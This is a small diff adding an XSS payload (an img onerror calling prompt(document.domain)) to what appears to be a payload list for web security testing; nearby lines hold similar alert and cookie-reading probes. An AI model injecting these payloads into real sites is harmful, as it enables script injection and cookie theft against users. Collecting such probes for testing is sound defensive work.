@@ -9,6 +9,8 @@
 
 "><img src=x onerror=alert(1)>
 
+"><img src=x onerror=prompt(document.domain)>
+
 "><img src="x" onerror='alert(1)'>
 
 "><svg/onload-alert(document.cookie)>
